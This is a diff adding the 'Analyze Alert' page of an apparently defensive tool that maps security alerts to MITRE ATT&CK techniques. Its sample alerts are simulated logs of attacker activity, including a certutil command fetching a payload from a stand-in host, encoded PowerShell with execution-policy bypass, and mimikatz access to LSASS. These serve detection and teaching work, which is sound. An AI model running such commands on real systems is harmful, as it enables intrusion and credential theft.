@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Analyze Alert — MITRE ATT&CK Alert Mapper</title>
+<link rel="stylesheet" href="/static/css/app.css"/>
+</head>
+<body>
+<div class="app-layout">
+  <aside class="sidebar">
+    <div class="sidebar-brand">
+      <div class="logo">🛡 ATT&CK Mapper</div>
+      <div class="tagline">MITRE ATT&CK Alert Mapper</div>
+    </div>
+    <nav class="sidebar-nav">
+      <a href="/"           class="nav-item" data-page="dashboard"> <span class="icon">📊</span> Dashboard</a>
+      <a href="/analyze"    class="nav-item" data-page="analyze">   <span class="icon">🔍</span> Analyze Alert</a>
+      <a href="/history"    class="nav-item" data-page="history">   <span class="icon">📋</span> Alert History</a>
+      <a href="/techniques" class="nav-item" data-page="techniques"><span class="icon">🎯</span> MITRE Techniques</a>
+      <a href="/about"      class="nav-item" data-page="about">     <span class="icon">ℹ️</span> About</a>
+    </nav>
+  </aside>
+
+  <div class="main-content">
+    <div class="topbar">
+      <div>
+        <div class="topbar-title">Analyze Alert</div>
+        <div class="topbar-sub">Submit a security event for MITRE ATT&CK mapping</div>
+      </div>
+    </div>
+
+    <div class="page">
+      <div style="display:grid;grid-template-columns:1fr 1.6fr;gap:20px;align-items:start">
+
+        <!-- Input panel -->
+        <div class="card" style="position:sticky;top:80px">
+          <div class="card-title">Alert Input</div>
+
+          <div class="tabs" id="input-tabs">
+            <button class="tab-btn" data-tab="text">Plain Text</button>
+            <button class="tab-btn" data-tab="json">JSON</button>
+            <button class="tab-btn" data-tab="sample">Load Sample</button>
+          </div>
+
+          <div class="tab-panel" data-tab="text">
+            <div class="form-group">
+              <label>Alert / Log Text</label>
+              <textarea id="input-text" placeholder="Paste your alert or log event here...&#10;&#10;Example:&#10;Process Creation | powershell.exe -EncodedCommand ..." rows="10"></textarea>
+            </div>
+          </div>
+
+          <div class="tab-panel" data-tab="json">
+            <div class="form-group">
+              <label>JSON Alert</label>
+              <textarea id="input-json" placeholder='{"event_type": "process_creation", "process": "powershell.exe", "command_line": "powershell -enc ...", "user": "jsmith", "host": "WKSTN-01"}' rows="10"></textarea>
+            </div>
+          </div>
+
+          <div class="tab-panel" data-tab="sample">
+            <div class="form-group">
+              <label>Choose a sample alert</label>
+              <select id="sample-select">
+                <option value="">— Select sample —</option>
+              </select>
+            </div>
+            <div style="margin-top:8px">
+              <pre id="sample-preview" style="max-height:180px;overflow-y:auto;font-size:11px"></pre>
+            </div>
+            <button class="btn btn-secondary" style="margin-top:10px;width:100%" onclick="loadSampleToInput()">Use This Sample</button>
+          </div>
+
+          <button id="analyze-btn" class="btn btn-primary" style="width:100%;margin-top:8px" onclick="submitAnalyze()">
+            🔍 Analyze Alert
+          </button>
+          <div id="analyze-error" style="color:var(--danger);font-size:12px;margin-top:8px"></div>
+        </div>
+
+        <!-- Results panel -->
+        <div id="results-panel">
+          <div class="card" style="text-align:center;color:var(--muted);padding:48px">
+            <div style="font-size:36px;margin-bottom:12px">🛡</div>
+            <p>Submit an alert to see MITRE ATT&CK mappings, indicators, and investigation guidance.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script src="/static/js/app.js"></script>
+<script>
+setActiveNav("analyze");
+initTabs("#input-tabs");
+
+const SAMPLES = [
+  { label: "PowerShell Encoded Command",
+    format: "text",
+    value: `Process Creation | Host: WORKSTATION-42 | User: jsmith | Image: powershell.exe | CommandLine: powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIA== | ParentImage: winword.exe | Timestamp: 2024-06-01T09:23:11Z` },
+  { label: "Multiple Failed Logins (Brute Force)",
+    format: "text",
+    value: `Security Event | EventID: 4625 | Host: DC-01 | TargetUsername: administrator | FailureReason: Bad Password | SourceIP: 185.220.101.47 | Count: 47 failed attempts in 3 minutes | Timestamp: 2024-06-01T10:05:00Z` },
+  { label: "New User Account Created (JSON)",
+    format: "json",
+    value: JSON.stringify({"event_type":"user_created","event_id":4720,"host":"FILESERVER-01","created_by":"DOMAIN\\svc_backup","new_account":"support_temp","timestamp":"2024-06-01T11:30:00Z","group_memberships":["Administrators"]}, null, 2) },
+  { label: "Suspicious Scheduled Task",
+    format: "text",
+    value: `Process Creation | Host: LAPTOP-09 | User: mlopez | Image: schtasks.exe | CommandLine: schtasks /Create /SC ONLOGON /TN WindowsUpdate /TR C:\\Users\\Public\\updater.exe /RU SYSTEM | Timestamp: 2024-06-01T13:45:00Z` },
+  { label: "Credential Dumping (LSASS)",
+    format: "text",
+    value: `Sysmon Event 10 (ProcessAccess) | Host: WKSTN-77 | SourceImage: C:\\Windows\\Temp\\svhost.exe | TargetImage: C:\\Windows\\System32\\lsass.exe | GrantedAccess: 0x1fffff | CallTrace: mimikatz.exe | User: DOMAIN\\hacker | Timestamp: 2024-06-01T14:10:00Z` },
+  { label: "Network Discovery",
+    format: "text",
+    value: `Process Creation | Host: WKSTN-12 | User: analyst | Image: cmd.exe | CommandLine: cmd.exe /c ipconfig /all && netstat -an && arp -a && nslookup corp.domain.local | Timestamp: 2024-06-01T15:00:00Z` },
+  { label: "Suspicious Outbound Connection",
+    format: "text",
+    value: `Network Connection | Host: WKSTN-33 | DestinationIP: 185.234.218.112 | DestinationPort: 4444 | SourceIP: 10.0.0.55 | Process: powershell.exe | User: jdoe | Note: Suspicious outbound connection to known C2 IP | Timestamp: 2024-06-01T16:20:00Z` },
+  { label: "RDP Login from External IP",
+    format: "text",
+    value: `Logon Event | EventID: 4624 | LogonType: 10 | Host: DATACENTER-SRV | TargetUsername: dbadmin | SourceIP: 203.0.113.44 | Port: 3389 | Note: RDP login from external IP outside business hours | Timestamp: 2024-06-01T02:15:00Z` },
+  { label: "Account Discovery via Net Commands",
+    format: "text",
+    value: `Process Creation | Host: WKSTN-21 | User: temp_user | Image: cmd.exe | CommandLine: cmd /c net user /domain && net group "Domain Admins" /domain | ParentImage: powershell.exe | Timestamp: 2024-06-01T17:05:00Z` },
+  { label: "File Download via certutil",
+    format: "text",
+    value: `Process Creation | Host: WKSTN-08 | User: contractor | Image: certutil.exe | CommandLine: certutil.exe -urlcache -split -f http://evil.example.com/payload.exe C:\\Windows\\Temp\\payload.exe | Timestamp: 2024-06-01T18:00:00Z` },
+  { label: "Suspicious File Execution",
+    format: "text",
+    value: `File Execution | Host: HR-PC-05 | User: kpatel | Image: C:\\Users\\kpatel\\Downloads\\Invoice_Jan2024.exe | Hash: a1b2c3d4e5f67890 | ParentProcess: explorer.exe | ChildProcess: cmd.exe, powershell.exe | Timestamp: 2024-06-01T09:01:00Z` },
+  { label: "Password Spraying",
+    format: "json",
+    value: JSON.stringify({"event_type":"authentication","status":"multiple_failures","username":"serviceaccount","source_ip":"10.10.5.200","destination":"EXCHANGE-01","failure_count":23,"timespan_minutes":2,"reason":"password spraying detected","timestamp":"2024-06-01T20:30:00Z"}, null, 2) },
+];
+
+// Populate sample select
+const sel = document.getElementById("sample-select");
+SAMPLES.forEach((s, i) => {
+  const opt = document.createElement("option");
+  opt.value = i;
+  opt.textContent = s.label;
+  sel.appendChild(opt);
+});
+
+sel.addEventListener("change", () => {
+  const s = SAMPLES[parseInt(sel.value)];
+  if (s) document.getElementById("sample-preview").textContent = s.value;
+});
+
+function loadSampleToInput() {
+  const idx = parseInt(sel.value);
+  if (isNaN(idx)) return;
+  const s = SAMPLES[idx];
+  if (s.format === "json") {
+    document.getElementById("input-json").value = s.value;
+    document.querySelector('.tab-btn[data-tab="json"]').click();
+  } else {
+    document.getElementById("input-text").value = s.value;
+    document.querySelector('.tab-btn[data-tab="text"]').click();
+  }
+}
+
+function getActiveInput() {
+  const activePanel = document.querySelector(".tab-panel.active");
+  if (!activePanel) return { raw: "", fmt: "text" };
+  const tab = activePanel.dataset.tab;
+  if (tab === "json") return { raw: document.getElementById("input-json").value.trim(), fmt: "json" };
+  return { raw: document.getElementById("input-text").value.trim(), fmt: "text" };
+}
+
+async function submitAnalyze() {
+  const btn = document.getElementById("analyze-btn");
+  const errDiv = document.getElementById("analyze-error");
+  const { raw, fmt } = getActiveInput();
+  errDiv.textContent = "";
+
+  if (!raw) { errDiv.textContent = "Please enter an alert before analyzing."; return; }
+
+  btn.disabled = true;
+  btn.innerHTML = '<span class="spinner"></span> Analyzing…';
+  document.getElementById("results-panel").innerHTML = '<div style="text-align:center;padding:40px"><div class="spinner"></div><p style="margin-top:12px;color:var(--muted)">Analyzing alert…</p></div>';
+
+  try {
+    const result = await API.post("/api/alerts/analyze", { raw_input: raw, input_format: fmt });
+    renderResults(result);
+    showToast("Alert analyzed successfully!", "success");
+  } catch (e) {
+    errDiv.textContent = e.message;
+    document.getElementById("results-panel").innerHTML = `<div class="card"><div class="empty-state"><div class="icon">⚠️</div><p>${escHtml(e.message)}</p></div></div>`;
+    showToast("Analysis failed: " + e.message, "error");
+  } finally {
+    btn.disabled = false;
+    btn.innerHTML = "🔍 Analyze Alert";
+  }
+}
+
+function renderResults(r) {
+  const panel = document.getElementById("results-panel");
+
+  // Extract indicators
+  const indicators = [];
+  if (r.username) indicators.push(`👤 Username: ${r.username}`);
+  if (r.source_ip) indicators.push(`🌐 Source IP: ${r.source_ip}`);
+  if (r.destination_ip) indicators.push(`🎯 Dest IP: ${r.destination_ip}`);
+  if (r.process_name) indicators.push(`⚙️ Process: ${r.process_name}`);
+  if (r.file_name) indicators.push(`📄 File: ${r.file_name}`);
+  if (r.hostname) indicators.push(`🖥 Host: ${r.hostname}`);
+  if (r.command_line) indicators.push(`💻 Command: ${r.command_line.slice(0,100)}${r.command_line.length > 100 ? '…' : ''}`);
+
+  const mappingsHtml = r.mappings.length === 0
+    ? `<div class="empty-state"><div class="icon">❓</div><p>No MITRE ATT&CK techniques matched this alert. Try adding more detail.</p></div>`
+    : r.mappings.map((m, i) => `
+        <div class="mapping-panel">
+          <div class="mapping-header">
+            <span class="panel-arrow">${i === 0 ? '▼' : '▶'}</span>
+            ${techBadge(m.technique_id, m.technique_name)}
+            <strong style="flex:1">${escHtml(m.technique_name)}</strong>
+            ${tacticBadge(m.tactic_name)}
+            ${confidenceBadge(m.confidence)}
+          </div>
+          <div class="mapping-body${i === 0 ? '' : ' collapsed'}">
+            <div style="margin:12px 0">
+              <div class="card-title">Explanation</div>
+              <p style="color:var(--muted);font-size:13px">${escHtml(m.explanation)}</p>
+            </div>
+            ${m.indicators_found.length ? `
+            <div style="margin:12px 0">
+              <div class="card-title">Indicators Found</div>
+              <div class="indicator-list">${m.indicators_found.map(ind => `<span class="indicator-tag">${escHtml(ind)}</span>`).join("")}</div>
+            </div>` : ""}
+            ${m.investigation_steps.length ? `
+            <div style="margin:12px 0">
+              <div class="card-title">🔎 Investigation Steps</div>
+              <ul class="steps-list">${m.investigation_steps.map(s => `<li>${escHtml(s)}</li>`).join("")}</ul>
+            </div>` : ""}
+            ${m.sigma_rules && m.sigma_rules.length ? `
+            <div style="margin:12px 0">
+              <div class="card-title">Sigma Rules</div>
+              <div style="display:flex;flex-wrap:wrap;gap:6px">
+                ${m.sigma_rules.map(sr => `<span class="badge badge-sigma" title="${escHtml(sr.description || '')}">${escHtml(sr.title)}</span>`).join("")}
+              </div>
+            </div>` : ""}
+            <div style="margin-top:12px">
+              <a href="https://attack.mitre.org/techniques/${m.technique_id.replace('.','/')}/" target="_blank" class="btn btn-secondary" style="font-size:12px">
+                🔗 View on MITRE ATT&CK
+              </a>
+              <a href="/alert/${r.id}" class="btn btn-secondary" style="font-size:12px;margin-left:8px">
+                📋 Full Details
+              </a>
+            </div>
+          </div>
+        </div>
+      `).join("");
+
+  panel.innerHTML = `
+    <!-- Flow diagram -->
+    <div class="card">
+      <div class="card-title">Analysis Flow</div>
+      <div class="flow-diagram">
+        <div class="flow-step">📥 Original Alert: ${escHtml(r.alert_type || "Security Alert")}</div>
+        <div class="flow-arrow">↓</div>
+        <div class="flow-step">🔬 Extracted ${indicators.length} indicator(s)</div>
+        <div class="flow-arrow">↓</div>
+        <div class="flow-step">🎯 Mapped to ${r.mappings.length} MITRE ATT&CK technique(s)</div>
+        <div class="flow-arrow">↓</div>
+        <div class="flow-step">🔎 Investigation guidance provided</div>
+      </div>
+    </div>
+
+    <!-- Indicators -->
+    <div class="card">
+      <div class="card-title">Extracted Indicators</div>
+      ${indicators.length
+        ? `<div class="indicator-list">${indicators.map(i => `<span class="indicator-tag">${escHtml(i)}</span>`).join("")}</div>`
+        : '<p style="color:var(--muted)">No specific indicators extracted.</p>'}
+    </div>
+
+    <!-- Mappings -->
+    <div class="card">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
+        <div class="card-title" style="margin:0">MITRE ATT&CK Mappings (${r.mappings.length})</div>
+        ${r.top_confidence ? confidenceBadge(r.top_confidence) : ""}
+      </div>
+      ${mappingsHtml}
+    </div>
+
+    <!-- View full detail button -->
+    <div style="text-align:center;margin-top:8px">
+      <a href="/alert/${r.id}" class="btn btn-primary">📋 View Full Alert Detail Page</a>
+    </div>
+  `;
+
+  initMappingPanels();
+}
+</script>
+</body>
+</html>
